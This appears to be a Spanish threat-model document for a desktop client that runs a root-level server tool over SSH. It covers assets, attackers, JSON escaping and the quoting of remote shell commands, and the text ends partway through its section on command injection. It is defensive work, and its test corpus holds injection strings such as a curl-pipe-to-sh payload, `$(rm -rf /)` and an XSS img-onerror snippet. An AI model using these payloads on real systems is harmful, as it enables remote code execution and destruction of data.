# Modelo de amenazas y reglas duras del cliente

> Orbit Desktop no es «un cliente de una API». Es una aplicación de escritorio
> con **privilegios equivalentes a root en uno o varios servidores de
> producción**, por diseño y no por accidente. Este documento dice qué se
> protege, de quién, cómo, y —la parte más útil— **qué no se protege**.
>
> Se escribe antes que el código por el mismo motivo por el que Orbit escribió
> su §13 antes que este repositorio: lo que no está decidido antes de la primera
> pantalla se decide después a la carrera, cuando ya hay usuarios y ya hay
> servidores de producción detrás.
>
> El plan de pruebas que demuestra que estas reglas se cumplen está en
> **[QA.md](QA.md)**. Un modelo de amenazas sin criterios de aceptación es una
> redacción; unos criterios sin modelo de amenazas son una lista de deseos.

> **Cómo leer las referencias.** Este documento y [QA.md](QA.md) eran uno solo y comparten numeración: aquí viven las §0 a §4 y el apéndice, y allí de la §5 en adelante. Las amenazas se citan como **T-nn** y las reglas duras como **SEC-nn**, y las dos series se definen aquí.

---

## 0. Lo primero, porque cambia todo lo demás

Orbit Desktop no es «un cliente de una API». Es **una aplicación de escritorio que
tiene root en uno o varios servidores de producción**, y conviene decirlo con las
palabras exactas del propio Orbit antes de empezar a razonar sobre nada:

- `orbit` se auto-eleva a root. Está en el fichero, líneas 241-260: si `$EUID` no es
  0 y el comando no es `init`, hace `exec sudo -- "$0" "$@"`. No hay una versión sin
  privilegios de Orbit; sólo `orbit init` vive fuera de esa regla, y precisamente
  porque no toca el servidor.
- Casi todos los comandos llaman a `need_root` (línea 854, `[[ $EUID -eq 0 ]] || die …`).
  `deploy` (5188), `rollback` (6699), `exec` (8992), `env` (11193), `remove` (11303),
  `db` (7588), `backup` (7991), `restore` (8298), `firewall` (12170)… la lista es
  prácticamente el producto entero.
- `orbit exec <app> <cmd>` ejecuta lo que le pases dentro del entorno de la app
  (líneas 8991-9027). El propio `ARCHITECTURE.md` §13.3 dice que un panel web sobre
  esto «no es un panel: es **una shell de root expuesta a internet**», y cita
  CVE-2025-48703 de CentOS Web Panel —RCE **sin autenticar** sobre unos 200.000
  servidores, explotada activamente— como el ejemplo de lo que pasa cuando eso se
  pone en un puerto.
- El BRIEF recoge la idea, aún no hecha, de un grupo `orbit-admin` con un sudoers
  limitado a `/usr/local/bin/orbit`. La honestidad de esa idea, ya escrita en el
  repo, es que **sigue siendo equivalente a root, porque `orbit exec` existe**. Es
  decir: no hay ningún nivel intermedio de privilegio que Orbit Desktop pueda pedir.
  O tienes root en ese servidor, o no puedes usar Orbit Desktop contra él.

De ahí sale la frase que hay que tener delante todo el rato:

> **Comprometer Orbit Desktop en el portátil de alguien es comprometer todos sus
> servidores de producción.** No es un cliente de gestión. Es una llave maestra con
> interfaz gráfica.

Esa asimetría tiene una consecuencia agradable y una desagradable.

La agradable: **la superficie de red de Orbit Desktop es cero**. No abre puertos, no
escucha nada, no expone un endpoint. Todo lo que hace sale por una conexión SSH que
el usuario inicia. Eso ya nos ahorra la categoría entera de vulnerabilidades que
mató a CWP. Es exactamente el regalo de §13.4: *«el servidor no gana un proceso, ni
un puerto, ni un byte de estado»*, y el cliente tampoco lo gana en el portátil.

La desagradable: **como no hay una frontera de red que defender, todas las amenazas
que quedan son de las otras clases** —el portátil, el canal, el contrato, la cadena
de suministro y la propia interfaz— y ninguna se resuelve con un cortafuegos. Hay
que resolverlas de una en una, y estructuralmente.

### 0.1 Lo que este documento hereda y no discute

Cinco reglas vienen del repositorio de Orbit y aquí se dan por cerradas. Se repiten
porque el resto del documento las usa como axiomas:

1. **La interfaz nunca escribe en `/etc/nginx`, `/etc/orbit` ni systemd. Solo invoca
   `orbit`.** (§13.4). Y hay un motivo de seguridad además del de coherencia que da
   §13.4: `load_app` hace `. "$(app_conf "$n")"` (líneas 1319-1328), o sea que **un
   fichero de configuración de app es código bash que se ejecuta como root**. Un
   cliente que escriba ahí no está editando datos: está escribiendo un ejecutable
   privilegiado desde una GUI.
2. **El servidor no gana ni un proceso, ni un puerto, ni un byte de estado.**
3. **Habla SSH, no una API propia.** Reutiliza claves, `ssh-agent` y `~/.ssh/config`,
   incluido `ProxyJump`.
4. **Los secretos no cruzan el contrato** (§13.2). `orbit env list --json` devuelve
   sólo nombres (verificado, líneas 11274-11285). Un valor se pide con
   `orbit env get <app> <CLAVE>`, que lo imprime pelado por stdout (línea 11225).
5. **La latencia del contrato es la latencia de la interfaz** (§13.6d).

### 0.2 Lo que este documento decide

Dos cosas, y conviene separarlas porque se confunden:

- **Reglas de seguridad**: invariantes del cliente, escritas de forma que se puedan
  comprobar con un test o con un `grep` en CI. Sección 2.
- **Plan de QA**: cómo se demuestra que las reglas se cumplen y que el cliente no
  miente. Secciones 5, 5b y 6.

Un modelo de amenazas sin criterios de aceptación es una redacción. Unos criterios
de aceptación sin modelo de amenazas son una lista de deseos. Van juntos o no van.

---

## 1. Modelo de amenazas

### 1.1 Activos

Ordenados por lo que cuesta perderlos, no por lo que cuesta protegerlos. La
diferencia importa: el activo más caro de este sistema es también el más fácil de
proteger, y el más difícil de proteger es de valor medio. Si se ordena al revés se
acaba invirtiendo el esfuerzo donde no toca.

| # | Activo | Dónde vive | Qué pasa si se pierde |
|---|---|---|---|
| A1 | **La clave privada SSH del usuario** | `~/.ssh/id_*` en el portátil, o el llavero/agente | Acceso root a todos los servidores donde esa clave está autorizada. Es la pérdida total. |
| A2 | **El servidor entero** | El VPS | Datos de los clientes finales, dominios, certificados, correo saliente. Un servidor de Orbit corre *varias* webs (§5.3, aislamiento por app), así que un servidor caído son N clientes caídos. |
| A3 | **El contenido de los `.env`** | `/srv/apps/<app>/shared/.env`, `0640` | Contraseñas de base de datos, claves de API de terceros, `APP_KEY` de Laravel. `SECURITY.md` de Orbit ya avisa: *«los secretos están en texto plano… No es una bóveda»*. Lo que Orbit Desktop añade es una forma nueva de sacarlos de ahí: la pantalla. |
| A4 | **El token de Cloudflare** | En el servidor, puesto con `orbit cf-token` (línea 7504) | Control del DNS de todos los dominios de esa cuenta. Con DNS se emiten certificados a nombre de cualquiera de esos dominios y se redirige el tráfico. Es, en muchos despliegues, **más grave que el propio servidor**. |
| A5 | **El token de GitHub** | En el `HOME` de `deploy`, puesto con `orbit github` (línea 7533) | Lectura —y según el scope, escritura— de los repositorios privados. Escritura en un repo con autodespliegue puesto es ejecución de código en el servidor en el siguiente ciclo del temporizador. |
| A6 | **La base de datos** | PostgreSQL en localhost | `orbit db list --json` publica nombres y tamaños (línea 7615); `orbit exec <app> psql …` da acceso directo. |
| A7 | **La lista de servidores del cliente** | Config de Orbit Desktop en el portátil | Por sí sola no da acceso, pero es **el mapa**: hostnames, usuarios, puertos, rutas de clave, apps y dominios. Para un atacante que ya tiene A1 y no sabe dónde usarla, esto es la mitad del trabajo. Se subestima siempre. |
| A8 | **El histórico de despliegues y el estado observado** | Servidor (`orbit metrics`, `orbit traffic`, `orbit list`) | Bajo valor por sí mismo, pero `orbit traffic` contiene **IPs de visitantes** (§13.8), y eso convierte una captura de pantalla en un dato personal. Cuenta para RGPD aunque no cuente para un atacante. |
| A9 | **El binario del propio cliente** | Portátil del usuario, y el canal de actualización | Firmarlo mal o distribuirlo mal convierte a Orbit Desktop en el vector: una actualización maliciosa se instala sola en el equipo que tiene A1. |

Vale la pena señalar dos cosas de esta tabla, porque orientan el resto del documento.

**A7 no está en ningún modelo de amenazas de este tipo de producto, y debería.** La
lista de servidores no es un secreto en el sentido criptográfico —no abre nada— pero
convierte un compromiso genérico del portátil en un compromiso dirigido. Un
`infostealer` que se lleva `~/.ssh` se lleva claves que no sabe dónde encajar; si
además se lleva el `servers.json` de Orbit Desktop, se lleva el manual de
instrucciones. La mitigación es barata y está en §4.

**A4 es probablemente el activo peor valorado del sistema.** El token de Cloudflare
vive en el servidor, sí, pero Orbit Desktop va a tener una pantalla que lo escribe
(`orbit cf-token`) y probablemente un formulario donde se pega. En ese momento el
token pasa por la memoria del cliente, por el portapapeles del sistema operativo y,
si nadie lo impide, por el registro de errores.

### 1.2 Actores

No «hackers». Actores concretos, con una capacidad concreta, porque de la capacidad
sale la mitigación.

| # | Actor | Qué puede hacer | Qué no puede |
|---|---|---|---|
| C1 | **Malware genérico en el portátil (infostealer)** | Leer ficheros del usuario: `~/.ssh`, config de la app, `localStorage`, capturas. Es la clase más común, se compra hecha. | Normalmente no hace análisis dirigido ni espera meses. Se lleva lo que reconoce por patrón. |
| C2 | **Atacante dirigido con acceso al portátil** | Todo lo de C1, más leer memoria del proceso, hacer *hook* del agente SSH, esperar a que el usuario desbloquee. | Poco: si tiene esto, ha ganado. El objetivo aquí no es impedirlo, es **acotar la ventana y dejar rastro**. |
| C3 | **Uno de los servidores gestionados, comprometido** | Devolver lo que quiera por stdout y stderr. Tardar lo que quiera. Cerrar la conexión cuando quiera. **Esto es un actor de primera clase y casi nunca se modela.** | No puede iniciar la conexión, ni hablar con los otros servidores del usuario… salvo a través del cliente. |
| C4 | **Red hostil (cafetería, hotel, ISP)** | Ver metadatos de la conexión, intentar un man-in-the-middle en el primer contacto SSH. | Romper SSH ya establecido con host key conocida. |
| C5 | **Cadena de suministro (npm, cargo, CI, actualizador)** | Ejecutar código con los permisos del usuario en el equipo que tiene A1. | Nada que lo pare una vez dentro, salvo que no llegue. |
| C6 | **Compañero de equipo con acceso legítimo** | Todo lo que el producto le permita, con su propia clave, desde su propio portátil, sin que nadie más se entere. Y —lo que casi nunca se modela— **equivocarse con toda la autoridad del mundo**: el borrado accidental de un compañero es indistinguible de uno malicioso. | Nada. No hay control de acceso por rol, y no lo puede haber: ver T-14. |
| C7 | **Quien mira la pantalla**: hombro, videollamada compartida, captura pegada en un issue | Leer lo que esté pintado. | — |

C3 y C7 son los dos que este producto añade y que Orbit-el-servidor no tiene. C3
existe porque el cliente **habla con varios servidores** y confía en lo que le
contestan. C7 existe porque hasta ahora la salida de `orbit` se leía en un terminal
que nadie fotografía, y a partir de Orbit Desktop se lee en una ventana que la gente
pega en Slack y en los issues. §13.2 ya lo dijo para el `.env`; hay que extenderlo.

### 1.3 Superficies de ataque

1. **El disco del portátil**: config del cliente, caché, logs, base de datos local
   si la hay, ficheros temporales, informes de fallo.
2. **La memoria del proceso**: valores de `env get`, salida de `logs`, tokens
   pegados.
3. **La construcción de la línea de comandos SSH**: el punto donde una cadena que
   escribió el usuario se convierte en algo que un shell remoto interpreta.
4. **El canal SSH**: primer contacto, `known_hosts`, `ProxyJump`, agente y su
   reenvío.
5. **El parseo de la respuesta**: todo lo que llega del servidor.
6. **El renderizado**: lo que se pinta con esos datos.
7. **La cadena de suministro del cliente**: dependencias, build, firma, actualizador.
8. **Los canales de salida**: telemetría, informes de fallo, logs, portapapeles,
   capturas.

### 1.4 Escala de severidad

Uso cuatro niveles y los defino, porque «alto» sin definición no es información:

- **Crítica**: lleva a ejecución de código o acceso root en un servidor de
  producción, o a la pérdida de A1/A4, sin necesitar otro fallo previo.
- **Alta**: filtra un secreto (A3, A4, A5) o permite una acción destructiva no
  querida, o convierte un compromiso parcial en total.
- **Media**: filtra metadatos aprovechables (A7, A8), o degrada una garantía sin
  romperla del todo.
- **Baja**: molesta, confunde o incumple una expectativa, sin consecuencia directa
  de seguridad.

---

### 1.5 Amenazas, una a una

#### T-01 · Compromiso del equipo del usuario: malware que lee la configuración del cliente
**Actores:** C1, C2. **Activos:** A1, A7, A3 (si se cachea), A4/A5 (si se cachean).
**Severidad: Crítica.**

Es el escenario base y hay que asumirlo, no descartarlo. El razonamiento honesto es
éste: **si el atacante ya ejecuta código como el usuario, no hay nada que Orbit
Desktop pueda hacer para impedirle usar la sesión SSH del usuario.** Puede hablar con
el agente, puede lanzar `ssh` él mismo, puede esperar. Cualquier promesa de lo
contrario es marketing.

Lo que sí se puede hacer, y es mucho, es **no ampliar el daño**:

- **No guardar nada que el atacante no tuviera ya.** Si el cliente no guarda
  contraseñas ni frases de paso, un infostealer que vacía la carpeta de configuración
  de Orbit Desktop se lleva A7 y nada más. Si el cliente sí las guarda, se lleva A1
  utilizable sin agente, sin frase de paso y sin el usuario delante. La diferencia
  entre esas dos frases es todo el valor de esta mitigación.
- **No cachear valores de `env get` en disco. Nunca.** El activo A3 sólo debe existir
  en la memoria del proceso y sólo mientras la pantalla que lo pidió está abierta.
- **Permisos de fichero estrictos** (`0700` en el directorio, `0600` en los ficheros)
  no paran a C1 —corre como el mismo usuario— pero sí paran el caso real de un
  equipo compartido, un backup mal hecho, un contenedor con el `$HOME` montado o una
  sincronización a la nube que sube el directorio de configuración.
- **Anotar el uso**: un registro local, sólo en el equipo, de qué comando destructivo
  se ejecutó contra qué servidor y cuándo. No previene nada; permite responder a
  «¿qué me han hecho?» sin adivinar. C2 lo puede borrar, pero C1 casi nunca lo hace.

**Lo que se descarta:** cifrar la configuración con una clave que también está en el
disco. Es una ofuscación con nombre de cifrado. Si el usuario quiere una frase de
paso para el cliente, eso es un bloqueo real (§4.4) y hay que llamarlo así; si no la
quiere, la config va en claro con permisos correctos y se dice en la documentación.
La única variante honesta de «config cifrada» es la que usa el llavero del sistema
operativo, y ahí lo que se protege es la clave, no el fichero.

---

#### T-02 · Un servidor comprometido devuelve JSON malicioso al cliente
**Actor:** C3. **Activos:** el portátil (A1, A7) y, por él, los **otros** servidores.
**Severidad: Crítica** si el cliente ejecuta lo que pinta; **Alta** si sólo lo pinta;
**Media** si sólo se cuelga.

Ésta es la amenaza que este producto crea de la nada, y merece el análisis largo,
porque la respuesta no es obvia.

El escenario: el usuario administra cinco servidores. Uno cae —una app con una
dependencia maliciosa, §14 de `SECURITY.md` de Orbit dice explícitamente que *«el
código que despliegas se ejecuta con los permisos de `deploy` durante el build»*—.
El atacante en ese servidor no tiene root todavía, pero sí tiene al usuario `deploy`,
y con él puede escribir en `/srv/apps/*`. Si además consigue root, puede escribir en
`/etc/orbit/apps/*.conf`, que es donde salen los nombres y dominios de las apps.

Y entonces el usuario abre Orbit Desktop y **pide una lista de apps a ese servidor**.
El servidor comprometido contesta lo que quiera. A partir de ese momento el atacante
está hablando con el cliente que tiene las llaves de los otros cuatro.

**Lo primero es saber qué escapa `_j_str` de verdad**, que es lo que pide el encargo.
Está en las líneas 1071-1080 de `orbit`:

```bash
_j_str() { # _j_str <texto> -> cadena JSON entrecomillada
  local s=${1-}
  s=${s//\\/\\\\}          # la barra invertida primero, o se escaparía a sí misma
  s=${s//\"/\\\"}
  s=${s//$'\b'/\\b}; s=${s//$'\f'/\\f}
  s=${s//$'\n'/\\n}; s=${s//$'\r'/\\r}; s=${s//$'\t'/\\t}
  s=${s//[[:cntrl:]]/}     # lo que quede de C0 no tiene escape corto: fuera
  printf '"%s"' "$s"
}
```

Escapa exactamente seis cosas y borra una séptima:

| Entrada | Salida | Comentario |
|---|---|---|
| `\` | `\\` | Primero, y con razón: al revés, el `\"` producido por la comilla se re-escaparía. `json_test.sh` lo fija con la comprobación *«barra y comilla»*. |
| `"` | `\"` | |
| `\b \f \n \r \t` | `\b \f \n \r \t` | |
| resto de C0 y DEL | **se borran** | `\a`, `\v`, `\0`, `\x1b`… desaparecen sin dejar rastro. |
| **todo lo demás** | **pasa tal cual** | |

Y «todo lo demás» incluye, textualmente:

- `<`, `>`, `&`, `'`, `/` — **no se tocan**. `</script>` sale entero.
- `U+2028` (LINE SEPARATOR) y `U+2029` (PARAGRAPH SEPARATOR) — no se tocan, porque no
  son C0. Son JSON perfectamente válido y **JavaScript inválido** si el JSON se
  incrusta literalmente en un `<script>`.
- Secuencias UTF-8 malformadas, si el fichero de configuración las trae. Bash mueve
  bytes; no valida que sean UTF-8. Un `JSON.parse` de un `Uint8Array` decodificado en
  modo estricto se cae ahí, y en modo tolerante inventa `U+FFFD`.
- Caracteres de control **C1** (`U+0080`–`U+009F`): con `LC_ALL` en una configuración
  UTF-8, `[[:cntrl:]]` los reconoce y los borra; con la configuración regional en `C`,
  no —y ARCHITECTURE §10 documenta que `LANG` viene vacío en cron y systemd—. O sea
  que **lo que borra ese último `s=${s//[[:cntrl:]]/}` depende del entorno del
  proceso remoto**, que el cliente no controla.
- Bidi overrides (`U+202E` RIGHT-TO-LEFT OVERRIDE y familia). Un nombre de app puede
  llevarlos y pintarse al revés de como está escrito. Es el ataque «Trojan Source»
  aplicado a una lista de la interfaz: un nombre que lleve un U+202E dentro se lee en
  pantalla como algo distinto de lo que se le va a mandar al servidor.

**Conclusión sobre `_j_str`: hace su trabajo, y su trabajo es producir JSON válido,
no producir HTML seguro.** No es un fallo de Orbit. Es una frontera que el servidor
no tiene por qué cruzar y el cliente sí. Si el cliente pinta esos datos con
`innerHTML`, con `dangerouslySetInnerHTML`, con un `v-html` o incrustando el JSON en
un `<script>` de una plantilla, el XSS es del cliente y las líneas 1071-1080 no lo
van a impedir.

**Y hay un camino concreto por el que un nombre arbitrario llega al contrato.**
`app_names()` (línea 1165) es:

```bash
app_names()  { local f; for f in "$APPS_CONF"/*.conf; do f="${f##*/}"; printf '%s\n' "${f%.conf}"; done; }
```

No filtra por `_app_name_ok`. La validación existe (línea 1175,
`^[a-z0-9][a-z0-9._-]{0,39}$` sin `..`) y se aplica **al crear** —`cmd_new` líneas
6940 y 6971, `cmd_clone` 7353, la restauración en 8383— pero no al **enumerar**. Un
fichero `/etc/orbit/apps/<lo que sea>.conf` colocado a mano por quien ya tiene root
en ese servidor sale en `orbit list --json` con ese nombre, escapado como JSON válido
y sin más filtro. No es una vulnerabilidad de Orbit —requiere root, y con root ya has
ganado ese servidor— pero **es exactamente el canal por el que C3 le habla al
cliente**.

Hay más campos sin `_j_str` de por medio, y son peores porque no son cadenas:

- **`"load"` en `orbit status --json`** (líneas 11493-11498) se emite con
  `"$(cut -d' ' -f1-3 /proc/loadavg | tr ' ' ',')"`. Sin `_j_num`, sin comillas, sin
  validación. En un servidor sano da `0.15,0.20,0.18`. Si `/proc/loadavg` no se
  puede leer, da la cadena vacía y el JSON sale `"load":[]` — **válido, con cero
  elementos**, y un cliente que pinte `load[0]` sin comprobar la longitud revienta.
- **`"cpu_percent"` en `orbit top --json`** (línea 8726) se compone a mano:
  `pct="$(( TM_PCT / 10 )).$(( TM_PCT % 10 ))"`. Con un `TM_PCT` negativo saldría
  `-1.-2`, que no es un número JSON. El código de §13.6 dice que un contador que
  retrocede se ignora, así que hoy no ocurre; pero la garantía la da esa lógica, no
  el emisor.
- `_j_num` (línea 1084) sólo acepta **enteros**: `^-?[0-9]+$`. Todo lo demás sale
  `null`. Es una decisión buena —«lo que no existe es null», §13.1— con un efecto que
  el cliente debe conocer: **un campo numérico puede venir `null` porque no aplica,
  porque no se sabe, o porque el servidor no supo formatearlo.** Los tres casos se
  ven igual.

**Mitigaciones, en orden de fuerza:**

1. **Ningún dato del servidor se interpreta como marcado, jamás.** El renderizado usa
   siempre nodos de texto (`textContent`, interpolación escapada del framework,
   widget de texto nativo). Prohibido `innerHTML` sobre datos del contrato, y eso se
   comprueba con un `grep` en CI, no con buena voluntad. Regla SEC-14.
2. **Ningún dato del servidor entra en una línea de comandos sin volver a pasar por
   el mismo argv separado que el resto.** Es fácil olvidarlo: el nombre de la app
   que se le manda a `orbit deploy` viene de `orbit list`, o sea del servidor. Si el
   servidor está comprometido, ese nombre es entrada hostil. **Un dato que ha dado la
   vuelta por el servidor no es de más confianza que uno tecleado; es de menos.**
3. **Validar la forma, no sanear el contenido.** Antes de usar un nombre de app como
   argumento, el cliente aplica **la misma regla que `_app_name_ok`** (línea 1175).
   Si no encaja, la app se muestra —tachada, marcada como «nombre no reconocido»— y
   **no se puede operar sobre ella desde la interfaz**. No se «arregla» el nombre: un
   nombre arreglado ya no identifica a nadie.
4. **Presupuesto de tamaño y de tiempo.** Un servidor comprometido puede contestar 4
   GB de JSON o gotear un byte por minuto. Límite duro de respuesta (propuesta: 8 MB;
   `orbit list --json` con 40 apps son decenas de kilobytes, §13.6d) y tiempo máximo
   por comando, con el tiempo del `deploy` aparte porque un build legítimo tarda
   minutos.
5. **Normalización de texto antes de pintar**: `NFC`, y marcado explícito de los
   caracteres bidi y de los invisibles, en vez de borrarlos. Borrarlos vuelve a
   caer en el error de arreglar el nombre.
6. **Aislar servidores entre sí en la interfaz.** Un servidor no debe poder influir
   en lo que se pinta de otro. Suena obvio y deja de serlo en cuanto hay una pantalla
   de «todas mis apps».

**Lo que se descarta:** pedirle a Orbit que escape `<` y `>` en `_j_str`. Sería
resolver en el servidor un problema del cliente, contaminaría el contrato para todos
los demás consumidores (`jq`, scripts), y no cubriría los otros vectores —bidi,
U+2028, UTF-8 roto—. El escapado de HTML se hace donde se genera el HTML. Es la misma
lógica de §13.1: *el JSON es el contrato y la tabla es la presentación*, con la
presentación ahora en otra máquina.

---

#### T-03 · Inyección de comandos al construir la orden SSH
**Actores:** C1, C3, C6, y **el propio usuario sin mala intención**.
**Activos:** todos. **Severidad: Crítica.**

Éste es el riesgo número uno del producto y el encargo lo dice bien: **hay que
resolverlo estructuralmente, no filtrando.** Escribo primero por qué filtrar no
funciona, porque es la solución que aparece sola en cuanto alguien tiene prisa.

**El problema, planteado con precisión.** Cuando se ejecuta
`ssh usuario@host 'comando'`, el argumento remoto **no** se le pasa a un `execve`.
`sshd` lo entrega al shell de login del usuario remoto, que lo interpreta. Es decir:
*siempre* hay un shell en el otro extremo. No hay una forma de decirle a `ssh` «esto
son argumentos separados, no los interpretes». Ésa es la propiedad incómoda sobre la
que hay que construir todo lo demás.

Peor: OpenSSH **concatena con espacios** los argumentos que le sobran. `ssh host a b c`
manda la cadena `a b c`. O sea que una aplicación que pase argumentos «separados»
al binario `ssh` no está pasando argumentos separados a nada; está construyendo una
cadena con espacios y creyendo que no.

**Las entradas hostiles son cinco, y las cinco son normales:**

| Entrada | De dónde viene | Ejemplo inocente que rompe |
|---|---|---|
| Nombre de app | Teclado o `orbit list` (T-02) | `mi-web` está bien; `a'; curl x.sh\|sh; '` no. |
| Dominio | Teclado, `orbit new`/`orbit domain` | **`orbit` no valida los dominios.** `cmd_new` (líneas 6989-6991) sólo comprueba que no esté vacío; `cmd_domain` (11287-11295) lo pide con `ask` y lo guarda. Un dominio con un `;` acaba en `server_name $names;` del vhost (línea 3907). |
| `--ref` de `deploy` | Teclado, o pegado de un PR | **Tampoco se valida** (líneas 5194-5195). Y aguas abajo, líneas 5283-5287, va a `as_deploy "git -C '$cache' cat-file -e '${fref}^{commit}'"`. Y `as_deploy` (línea 868) es `sudo -u "$DEPLOY_USER" -H bash -lc "$*"`. Una comilla simple dentro del `ref` cierra la del literal y **lo que siga se ejecuta como `deploy`**, que es el usuario que tiene el token de GitHub (A5) y la caché de los repos. |
| `--branch` | Teclado (`cmd_new`, línea 6900) | Sin validar; línea 5304 hace `as_deploy "cd '$cache' && git reset --hard origin/$A_BRANCH -q …"` — aquí la variable ya va **sin comillas dentro del literal**, así que basta un espacio para partir el comando. |
| El comando de `orbit exec` | Teclado, siempre | Es texto arbitrario por diseño. Y `cmd_exec` (líneas 9005-9013) tiene una regla que hay que conocer: si llega **un solo** argumento y contiene alguno de `[[:space:]|&;<>()$\`` `]`, se ejecuta como `bash -lc "$1"`. Con dos o más argumentos, se ejecuta tal cual. |

Nótese que **tres de esos cinco caminos ya están sin validar en el propio Orbit**.
No es un fallo explotable de Orbit —para llamar a `orbit deploy --ref` ya hace falta
root, `need_root` línea 5188— pero deja clarísima la regla que el cliente tiene que
adoptar: **el servidor no sanea nada por ti, y no debe hacerlo.** Si el cliente
manda basura, la basura se ejecuta.

**Esto ya no es una propuesta: está implementado, ejecutado y ha encontrado un fallo.**
La ronda 1 de este documento afirmaba que el escapado se resolvía con una prueba de
propiedad; la afirmación se ha convertido en medición. El escapador y su prueba están en
`tmp/escape/shquote.py` y `tmp/escape/prop_test.py`, y el resultado es:

| Shell | Casos | Resultado |
|---|---|---|
| `bash` 5.x | 7.116 | correcto |
| `dash` 0.5.x | 7.116 | correcto |
| `zsh` 5.9 | 7.116 | correcto |
| `busybox sh` (ash) | 7.116 | correcto |

**4 shells × 7.116 casos = 28.464 viajes de ida y vuelta.** La propiedad
`argv → escapar → shell remoto → argv` es la identidad en los cuatro. Semillas 20260830,
1, 7 y 31337, registradas para poder reproducir. El corpus fijo incluye lo que hace falta
que incluya: cadena vacía, `'`, `"`, `\`, `$HOME`, `` `id` ``, `a'; curl x.sh|sh; '`,
`--`, `-rf`, `~`, `*`, salto de línea, tabulador, `</script><img src=x onerror=…>`, un
nombre con `U+202E`, 64 KB de una letra, `ñandú`, un emoji, `$(rm -rf /)`, `${IFS}`,
`!!`, `^x^y`, `U+2028`, y las dos órdenes reales que el cliente va a mandar de verdad
(`orbit deploy mi-web --json` y `orbit exec web "psql 'select 1'"`).

**Y lo que hace que la prueba valga es que falló.** En la primera ejecución, y **sólo en
zsh**: 5 casos de 2.529. El escapador tenía un conjunto de caracteres «seguros» que se
pasan sin comillas, y `=` estaba dentro. zsh, con la opción `EQUALS` activa por defecto,
expande las palabras que empiezan por `=` —`=ls` se sustituye por la ruta de `ls`—, así
que el argumento `=Y` volvía como `zsh:1: Y not found`. **`bash`, `dash` y `busybox`
pasaban los 2.529 casos.**

El fallo se reproduce en cuatro líneas, y conviene tenerlo escrito porque es la clase de
cosa que se cuenta y no se comprueba. Con `=` dentro del conjunto seguro, el argumento
`=Y` viaja sin comillas, y:

```
bash      rc=0  devuelve '=Y'
dash      rc=0  devuelve '=Y'
zsh       rc=1  devuelve ''    stderr: zsh:1: Y not found
busybox   rc=0  devuelve '=Y'
```

Con el conjunto estrechado, los cuatro devuelven `=Y`.

Es exactamente el modo de fallo contra el que existe la prueba, y merece nombrarse
porque es la clase entera: **correcto en el shell donde se desarrolla, roto en el que usa
el usuario.** Nadie desarrolla en zsh y despliega en zsh a la vez; muchísima gente tiene
zsh como shell de login en su servidor porque lo puso `oh-my-zsh` hace tres años. Sin las
cuatro columnas de esa tabla, este fallo llega a producción y se manifiesta como «a veces
un despliegue con un `--ref` raro no funciona en el servidor de Juan».

**Y el arreglo no fue una lista negra.** No se añadió `=` a un conjunto de caracteres
prohibidos: se **estrechó el conjunto seguro** a `[A-Za-z0-9_./-]` y se entrecomilla todo
lo demás. La diferencia entre las dos formas es la tesis de esta sección entera:

> Cada carácter que se añade al conjunto seguro es una regla de expansión de cuatro
> shells que hay que conocer. Entrecomillar de más no cuesta nada; entrecomillar de menos
> es T-03.

Un byte nulo se **rechaza**, no se escapa: no puede viajar en un `argv`, y fingir que sí
es peor que fallar.

**La solución estructural.** Cuatro capas, y las cuatro hacen falta:

**Capa 1 — Una única función que construye órdenes remotas, y nada más la construye.**
Un solo punto en todo el código base donde una lista de argumentos se convierte en la
cadena que va a `ssh`. Firma conceptual:

```
remote_command(server: ServerRef, argv: List[String]) -> RemoteResult
```

`argv` es una lista. Nunca una cadena. El primer elemento es siempre la ruta
absoluta del binario (`/usr/local/bin/orbit`, o lo que diga la configuración del
servidor), no la palabra `orbit` resuelta por `PATH`. Y la función es la única que
tiene permitido invocar `ssh`. Se comprueba con un test de arquitectura: *ningún
fichero fuera de `transport/` menciona el binario `ssh` ni construye una cadena de
comando*. Sección 6, criterio B-03.

**Capa 2 — El escapado ocurre dentro de esa función, elemento a elemento.** Cada elemento
de `argv` se entrecomilla para POSIX shell y se unen con un espacio. El resultado es una
cadena que el shell remoto descompone **exactamente** en el `argv` original. El algoritmo,
ya escrito y probado, cabe en diez líneas:

```
si la cadena contiene un byte nulo  -> error, no se escapa
si la cadena está vacía             -> ''
si todos sus caracteres están en [A-Za-z0-9_./-]  -> tal cual
en cualquier otro caso              -> '…' con cada ' interna sustituida por '\''
```

Nótese que `printf %q` de bash **no** es la referencia aquí, aunque la ronda 1 lo citara
como equivalente aceptable: `%q` produce escapes específicos de bash —`$'\n'` para un salto
de línea— que `dash` y `busybox ash` no entienden. La forma que sostiene la propiedad en
los cuatro shells es la de arriba, con comillas simples y sin escapes de dólar. Es un
ejemplo pequeño de lo mismo: lo que funciona en el shell de casa no es lo que funciona en
el del usuario.

Aquí conviene ser preciso sobre por qué una función y no comillas a mano, porque el
propio Orbit hace las dos cosas y la diferencia se ve en su código:

- `_q()` (línea 1329) envuelve en comillas simples y duplica las internas como
  `'\''`. Es correcto **si se usa siempre**. Se usa para `save_app`.
- `printf '%q'` aparece sólo en cuatro sitios (líneas 1411, 2785, 10470, 11790).
- Y las líneas 5283-5304 escriben las comillas a mano en el literal
  (`'$fref'`, `'$cache'`), que es la forma que se rompe con una comilla simple dentro.

La regla que hay que heredar, dicha con la voz de Orbit: **una comilla escrita a mano
dentro de un literal es una comilla que alguien va a olvidar dentro de seis meses.**
Se pone la función, se pasa todo por ella y se prohíbe el literal. La función se escribe
una vez —el algoritmo de arriba, doce líneas— y se le hace la prueba de propiedad de §5.1 A,
que ya existe y ya ha encontrado algo.

**Capa 3 — Un `argv` tipado, no cadenas sueltas.** El código de la interfaz no
construye `["orbit", "deploy", app_name, "--json"]` a mano en veinte sitios. Construye
un objeto de comando —`Deploy { app, ref, json: true }`— y un traductor lo convierte
en `argv`. Motivo: **un `argv` construido a mano en veinte sitios se equivoca en el
sitio diecinueve**, y equivocarse aquí significa concatenar. Con un tipo intermedio,
el punto donde el nombre de la app se convierte en una cadena es uno, se prueba una
vez y se audita una vez.

Y hay un motivo de corrección además del de seguridad: `orbit deploy --json` **aborta
si no le das el nombre de la app** (línea 5252, *«no puedo preguntar»*), `--pick` está
prohibido con `--json` (línea 5254), y `orbit env --json` sólo vale para `list`
(línea 11197). Esas reglas viven en el servidor y, escritas también en el tipo, el
cliente no puede ni componer la llamada inválida.

**Capa 4 — Prohibir la ruta del shell donde no haga falta, y usarla explícitamente
donde sí.** Es la mitad que suele faltar. Casi todos los comandos de Orbit son
`orbit <sub> <args…>` y no necesitan ningún shell remoto más allá del inevitable.
